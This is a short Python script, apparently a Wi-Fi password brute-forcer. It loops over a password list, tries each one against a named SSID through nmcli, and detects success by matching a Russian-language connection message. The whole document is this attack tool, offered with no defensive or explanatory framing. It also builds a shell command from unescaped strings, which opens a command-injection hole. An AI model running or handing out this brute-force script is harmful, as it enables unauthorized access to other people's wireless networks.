import subprocess

network_name = "ssid"
passwords = []  # passwords list
found_password = None

for password in passwords:
    command = f"nmcli device wifi connect '{network_name}' password '{password}'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    if "Устройство «wlp19s0» успешно активировано с " in result.stdout:
        print(f"Successful connection with password: {password}")
        found_password = password
        break
    else:
        print(f"Connection failed with password: {password}")

if found_password:
    print(f"Found password: {found_password}")
else:
    print("Password not found")
